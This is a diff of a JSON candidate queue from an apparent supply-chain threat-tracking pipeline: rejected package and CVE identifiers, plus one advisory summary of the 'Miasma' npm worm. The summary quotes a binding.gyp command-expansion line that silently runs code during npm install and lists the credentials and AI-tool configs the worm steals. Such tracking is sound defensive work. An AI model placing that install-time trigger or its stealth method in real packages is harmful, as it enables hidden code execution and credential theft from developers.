@@ -1,6 +1,6 @@
 {
   "schema_version": "threatpedia-supply-chain-candidate-queue/1",
-  "generated_at": "2026-06-25T06:09:50.389Z",
+  "generated_at": "2026-06-25T09:52:22.820Z",
   "mode": "live",
   "drafting_enabled": false,
   "auto_drafting_allowed": false,
@@ -21,613 +21,613 @@
     "queue_path": ".github/pipeline/supply-chain-candidates/latest.json"
   },
   "summary": {
-    "raw_leads_loaded": 238,
-    "deduped_subjects": 231,
+    "raw_leads_loaded": 240,
+    "deduped_subjects": 237,
     "rejected_low_relevance": 80,
-    "classifier_candidates": 151,
+    "classifier_candidates": 157,
     "candidates_emitted": 40,
-    "candidates_carried_forward": 8,
+    "candidates_carried_forward": 18,
     "current_candidates": 40,
     "matched_existing": 0,
     "collector_errors": 0
   },
   "currency": {
     "latest_corpus_incident_at": "2026-05-28T00:00:00.000Z",
-    "latest_discovery_signal_at": "2026-06-25T06:02:17.000Z",
+    "latest_discovery_signal_at": "2026-06-25T09:31:21.973Z",
     "pending_candidate_count": 40,
     "pending_current_count": 40,
     "graph_latest_reflects": "discovery"
   },
   "feed_cursors": {
     "go": {
-      "cursor": "2026-06-24T10:43:03.384712Z",
+      "cursor": "2026-06-24T10:43:41.626352Z",
       "boundary_keys": [
-        "github.com/home-assistant/core\tv0.0.0-20260624103816-a734f7110cab\t2026-06-24T10:43:03.384712Z"
+        "github.com/artsy/metaphysics\tv0.0.0-20260623081708-488b47e2af70\t2026-06-24T10:43:41.626352Z"
       ]
     }
   },
   "collector_errors": [],
   "rejected": [
     {
-      "canonicalSubjectId": "pkg:npm/cimo/pid@1.1.29",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/bug-report@0.47.256",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:0f7996b8469b"
+        "npm-registry:0c7a4ec9dff1"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/opencode-darwin-arm64@1.17.10",
+      "canonicalSubjectId": "pkg:npm/noy-db/in-nuxt@0.1.0-pre.4",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:39aa3670f5d1"
+        "npm-registry:3120910d7f6e"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/opencode-windows-x64@1.17.10",
+      "canonicalSubjectId": "pkg:npm/sanity/schema@6.2.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:2ee029b808a4"
+        "npm-registry:404e48707c32"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/inquirer@1.1.0",
+      "canonicalSubjectId": "pkg:npm/noy-db/in-devtools-tui@0.2.0-pre.6",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:a16703ecaa8d"
+        "npm-registry:c3b56e6a440d"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/clack@1.2.0-dev.0",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/jira@0.47.256",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:6181981854dd"
+        "npm-registry:4525127723ba"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/pict-section-form@1.3.2",
+      "canonicalSubjectId": "pkg:npm/easycode-ai@1.1.33",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:d58d53305f28"
+        "npm-registry:04e510f80ba4"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/continuum-core@0.6.2",
+      "canonicalSubjectId": "pkg:npm/aisy/telegram-gw@0.1.2",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:addfcc0c72cb"
+        "npm-registry:b833f3f49298"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/prompt@1.2.0-dev.0",
+      "canonicalSubjectId": "pkg:npm/noy-db/by-peer@0.1.0-pre.4",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:d1542650d0cd"
+        "npm-registry:d82e27f3c156"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/ssbun/restore-cli@0.1.1",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/push-pub-sub@0.47.256",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:fd2b6b30c1b6"
+        "npm-registry:321752e08796"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/aexol/opencode-wizard@0.6.15",
+      "canonicalSubjectId": "pkg:npm/noy-db/at-macos-keychain@0.1.0-pre.16",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:98f5f321f672"
+        "npm-registry:3830373a919c"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/hallucination-studio/harness-engine@1.0.1",
+      "canonicalSubjectId": "pkg:npm/noy-db/at-gcp-kms@0.2.0-pre.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:ea007ea746af"
+        "npm-registry:99916de70d1c"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/man@1.1.0",
+      "canonicalSubjectId": "pkg:npm/aouda/client@0.0.2",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:fd83e1b6379f"
+        "npm-registry:1fbb9263294d"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/discover@1.1.0",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/permissions@0.47.256",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:c0c0b90de78e"
+        "npm-registry:e50fdc4bb7c5"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/openclaw-channel-gateway@1.0.3",
+      "canonicalSubjectId": "pkg:npm/noy-db/at-env@0.1.0-pre.16",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:dcea9c6f34b6"
+        "npm-registry:9a6fe678e4d1"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/typemorph-cli@0.5.3",
+      "canonicalSubjectId": "pkg:npm/a3s-lab/sentry@0.1.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:763e458fff2c"
+        "npm-registry:0c92d4186dbd"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/zod@1.1.0",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/user-account@0.47.257",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:225059ff63cf"
+        "npm-registry:58807f39b699"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/valibot@1.1.0",
+      "canonicalSubjectId": "pkg:npm/noy-db/at-azure-keyvault@0.2.0-pre.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:6fd4eeecb603"
+        "npm-registry:764f8cc7f9cf"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/atlassian-test-prod/synth-check@1.0.102670",
+      "canonicalSubjectId": "pkg:npm/sanity/mutator@6.2.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:3965944a106a"
+        "npm-registry:df634784372a"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/kiwa-test/ui@0.1.0",
+      "canonicalSubjectId": "pkg:npm/noy-db/at-aws-kms@0.2.0-pre.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:6a60f2ec306b"
+        "npm-registry:92b087127dbb"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/create-ts-safety-net@0.1.1",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/db-api-generator@0.47.256",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:9e9c33a4aae2"
+        "npm-registry:8a326a058749"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/temporal@1.1.0",
+      "canonicalSubjectId": "pkg:npm/noy-db/as-zip@0.1.0-pre.4",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:2354a4c07e88"
+        "npm-registry:697b3dcd91cd"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/run@1.1.0",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/thunderstorm@0.47.257",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:89b4c4873684"
+        "npm-registry:f32252c515a0"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/cimo/form-data_parser@1.1.47",
+      "canonicalSubjectId": "pkg:npm/noy-db/as-blob@0.1.0-pre.4",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:265b2ae430b6"
+        "npm-registry:7265c1672e09"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/optique/logtape@1.1.0",
+      "canonicalSubjectId": "pkg:npm/noy-db/to-supabase@0.1.0-pre.4",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:de9a528d9333"
+        "npm-registry:1c51ba563634"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/tokiui/ui@0.4.0",
+      "canonicalSubjectId": "pkg:npm/intuitionrobotics/firebase@0.47.257",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:f638e5c78fe6"
+        "npm-registry:a0882b564c63"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/kata-containers/kata-containers/src/tools/log-parser@v0.0.0-20260624065713-13b3020c3489",
+      "canonicalSubjectId": "pkg:golang/go.ytsaurus.tech/yt/admin/timbertruck@v0.0.0-20260624103819-a98b04ac8e84",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:b9a6ca04aded"
+        "go-index:44e07c282edd"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v6.5.217%2Bincompatible",
+      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v6.5.219%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:1060d2211a5c"
+        "go-index:f1e4bc4829c0"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/archie0125/osop-spec@v0.0.0-20260623111338-1f0953a5b38b",
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/protocolbuffers/go@v1.34.2-20260618223123-e61687448568.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:1da00ec5fcb0"
+        "go-index:34cda6b76a0f"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/hbase@v0.0.0-20260624100221-1517a07ac646",
+      "canonicalSubjectId": "pkg:golang/github.com/arnesacnussem/jellyfin-plugin-meilisearch@v0.0.0-20260623171346-a94b89c6f03e",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:dfdad91e55d4"
+        "go-index:dc2e49c978b7"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/pittcsc/summer2023-internships@v0.0.0-20260624103043-f26d4b3cda45",
+      "canonicalSubjectId": "pkg:golang/github.com/posthog/posthog-foss@v0.0.0-20260624103456-94a075e2b20c",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:92b504d3804d"
+        "go-index:9a8dade76527"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/ozhera@v2.1.1%2Bincompatible",
+      "canonicalSubjectId": "pkg:golang/github.com/ARPA-SIMC/agrolib@v0.0.0-20260623181416-d83fbca9fe5a",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:f848dd2131f7"
+        "go-index:3ff29102f793"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/grafana/grafana/pkg/apimachinery@v0.0.0-20260624103413-675c35e9e908",
+      "canonicalSubjectId": "pkg:golang/github.com/ScoopInstaller/Extras@v0.0.0-20260624093039-1d9755a599f8",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:06671951e452"
+        "go-index:b59ef6797386"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/grafana/grafana/apps/secret@v0.0.0-20260624103413-675c35e9e908",
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/grpc/go@v1.2.0-20260618223123-e61687448568.3",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:d3f3e81fa312"
+        "go-index:8e227cec103f"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/grafana/grafana/apps/example@v0.0.0-20260624103413-675c35e9e908",
+      "canonicalSubjectId": "pkg:golang/github.com/tofee/rclone@v0.0.0-20251031154238-becc068d363d",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:471b607bbfbe"
+        "go-index:48203c83a7b8"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/pocketsign/apis/protocolbuffers/go@v1.34.2-20260619064626-e5e95b496fc2.1",
+      "canonicalSubjectId": "pkg:golang/github.com/rancher/longhorn-engine@v1.11.3-rc1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:43d8970afff8"
+        "go-index:e6c7e9767896"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/cloudquery/cloudquery-platform-api-go/v2@v2.0.1",
+      "canonicalSubjectId": "pkg:golang/github.com/analyticalgraphicsinc/cesium@v0.0.0-20260622155851-135d31863f68",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:49e8e24c00d9"
+        "go-index:b0c411f99aeb"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/CloudPosse/atmos@v1.222.0-rc.7",
+      "canonicalSubjectId": "pkg:golang/github.com/GoogleCloudPlatform/golang-samples/datastore@v0.0.0-20260624000252-7bcce5ac11ab",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:61e97f45c864"
+        "go-index:860e862d2148"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/Aws/aws-sdk-go-v2/service/secretsmanager@v1.25.5",
+      "canonicalSubjectId": "pkg:golang/github.com/arosen93/quacc@v1.3.2",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:5284c33faad5"
+        "go-index:de1c6b53c2c0"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/Arelle/ixbrl-viewer@v0.0.0-20260618141546-4b8c3338120c",
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/pocketsign/apis/protocolbuffers/go@v1.36.3-20260623051258-33b3ef7fe928.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:4751ac13618e"
+        "go-index:95e501d7334a"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/1panel-dev/1panel@v0.0.0-20260624102351-3e0d0bb8091a",
+      "canonicalSubjectId": "pkg:golang/github.com/openshift/release@v0.0.0-20260624103527-495537e68aaa",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:bc667a7e2a0e"
+        "go-index:76e9dd016524"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/googlecloudplatform/golang-samples/run/testing@v0.0.0-20260624000252-7bcce5ac11ab",
+      "canonicalSubjectId": "pkg:golang/github.com/arran4/arran4@v0.0.0-20260624010831-8b83e93049ce",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:40a931ed8ffd"
+        "go-index:8801a01a60a0"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/Jbenet/goprocess@v0.1.2",
+      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v9.28.116%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:538307c7e4ff"
+        "go-index:f3b4173ef47f"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/opentofu/registry/src@v0.0.0-20260624095537-88eff179b8b2",
+      "canonicalSubjectId": "pkg:golang/github.com/apache/ozhera@v2.2.0%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:25da91c40741"
+        "go-index:e5699993d866"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/smartcontractkit/chainlink-common@v0.11.2-0.20260624104120-2cf3f51a6fb5",
+      "canonicalSubjectId": "pkg:golang/github.com/swi-prolog/swipl-devel@v0.0.0-20260624075216-6d1831a3e916",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:5cf675a9ff19"
+        "go-index:c5ef1aafc8fb"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/OffchainLabs/go-ethereum@v0.0.0-20260616211651-0f618f330b8d",
+      "canonicalSubjectId": "pkg:golang/github.com/facebookincubator/fizz@v0.0.0-20260624074231-3b5673b4b10c",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:205a8dcf2751"
+        "go-index:dfe84dcc7c03"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/ozhera@v2.2.5-incubating-rc5%2Bincompatible",
+      "canonicalSubjectId": "pkg:golang/github.com/kevingong2013/apkgo/v3@v3.5.3",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:44d1fc63ba0f"
+        "go-index:d00e2c5c04e4"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/pocketsign/apis/protocolbuffers/go@v1.36.2-20260619064626-e5e95b496fc2.1",
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/protocolbuffers/go@v1.28.1-20260618223123-e61687448568.3",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:de9d8892a618"
+        "go-index:d993907470bc"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/go-git/x/plugin/objectsigner/gpg@v0.2.0",
+      "canonicalSubjectId": "pkg:golang/github.com/artursepp/optimalportfolios@v5.4.2%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:df6fe2d04abe"
+        "go-index:047a23a0f526"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v6.8.98%2Bincompatible",
+      "canonicalSubjectId": "pkg:golang/github.com/tx7do/go-wind-plugins@v0.0.0-20260619052353-6c0b771184ef",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:9b1d11730f0d"
+        "go-index:3e54e2ff9533"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/home-assistant/core@v0.0.0-20260624103816-a734f7110cab",
+      "canonicalSubjectId": "pkg:golang/github.com/artsy/metaphysics@v0.0.0-20260623081708-488b47e2af70",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:6a981e9d9744"
+        "go-index:9e33e5472d07"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-13980",
+      "canonicalSubjectId": "CVE-2024-38107",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-13980"
+        "vulncheck-kev:CVE-2024-38107"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43978",
+      "canonicalSubjectId": "CVE-2022-24663",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43978"
+        "vulncheck-kev:CVE-2022-24663"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43975",
+      "canonicalSubjectId": "CVE-2019-15637",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43975"
+        "vulncheck-kev:CVE-2019-15637"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43971",
+      "canonicalSubjectId": "CVE-2021-28481",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43971"
+        "vulncheck-kev:CVE-2021-28481"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43976",
+      "canonicalSubjectId": "CVE-2021-40684",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43976"
+        "vulncheck-kev:CVE-2021-40684"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-7029",
+      "canonicalSubjectId": "CVE-2023-25690",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-7029"
+        "vulncheck-kev:CVE-2023-25690"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2020-10215",
+      "canonicalSubjectId": "CVE-2017-1000226",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2020-10215"
+        "vulncheck-kev:CVE-2017-1000226"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2019-3914",
+      "canonicalSubjectId": "CVE-2017-4946",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2019-3914"
+        "vulncheck-kev:CVE-2017-4946"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43938",
+      "canonicalSubjectId": "CVE-2022-24785",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43938"
+        "vulncheck-kev:CVE-2022-24785"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43932",
+      "canonicalSubjectId": "CVE-2022-25064",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43932"
+        "vulncheck-kev:CVE-2022-25064"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43917",
+      "canonicalSubjectId": "CVE-2014-2908",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43917"
+        "vulncheck-kev:CVE-2014-2908"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-13984",
+      "canonicalSubjectId": "CVE-2022-22005",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-13984"
+        "vulncheck-kev:CVE-2022-22005"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-13981",
+      "canonicalSubjectId": "CVE-2021-3018",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-13981"
+        "vulncheck-kev:CVE-2021-3018"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-39717",
+      "canonicalSubjectId": "CVE-2021-45837",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-39717"
+        "vulncheck-kev:CVE-2021-45837"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-6587",
+      "canonicalSubjectId": "CVE-2023-21932",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-6587"
+        "vulncheck-kev:CVE-2023-21932"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-37032",
+      "canonicalSubjectId": "CVE-2023-32784",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-37032"
+        "vulncheck-kev:CVE-2023-32784"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2021-33045",
+      "canonicalSubjectId": "CVE-2024-39631",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2021-33045"
+        "vulncheck-kev:CVE-2024-39631"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-28000",
+      "canonicalSubjectId": "CVE-2024-6753",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-28000"
+        "vulncheck-kev:CVE-2024-6753"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-7971",
+      "canonicalSubjectId": "CVE-2023-41642",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-7971"
+        "vulncheck-kev:CVE-2023-41642"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-7965",
+      "canonicalSubjectId": "CVE-2023-45249",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-7965"
+        "vulncheck-kev:CVE-2023-45249"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-36104",
+      "canonicalSubjectId": "CVE-2024-6188",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-36104"
+        "vulncheck-kev:CVE-2024-6188"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-38856",
+      "canonicalSubjectId": "CVE-2024-4879",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-38856"
+        "vulncheck-kev:CVE-2024-4879"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43354",
+      "canonicalSubjectId": "CVE-2024-5178",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43354"
+        "vulncheck-kev:CVE-2024-5178"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43283",
+      "canonicalSubjectId": "CVE-2024-6695",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43283"
+        "vulncheck-kev:CVE-2024-6695"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43306",
+      "canonicalSubjectId": "CVE-2024-7014",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43306"
+        "vulncheck-kev:CVE-2024-7014"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2017-8961",
+      "canonicalSubjectId": "CVE-2024-6828",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2017-8961"
+        "vulncheck-kev:CVE-2024-6828"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-28986",
+      "canonicalSubjectId": "CVE-2023-43795",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-28986"
+        "vulncheck-kev:CVE-2023-43795"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-36858",
+      "canonicalSubjectId": "CVE-2020-25540",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-36858"
+        "vulncheck-kev:CVE-2020-25540"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-36857",
+      "canonicalSubjectId": "CVE-2024-5217",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-36857"
+        "vulncheck-kev:CVE-2024-5217"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2016-4977",
+      "canonicalSubjectId": "CVE-2024-38771",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2016-4977"
+        "vulncheck-kev:CVE-2024-38771"
       ]
     }
   ],
   "candidates": [
     {
-      "candidateId": "SC-CAND-4426509ede80cf01",
-      "canonicalSubjectId": "MAL-2026-6436",
+      "candidateId": "SC-CAND-c69b76b6632f8327",
+      "canonicalSubjectId": "MAL-2026-6426",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malicious code in solo-nav (npm)",
-      "summary": "The `solo-nav` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
+      "title": "Malicious code in leo-connector-oracle (npm)",
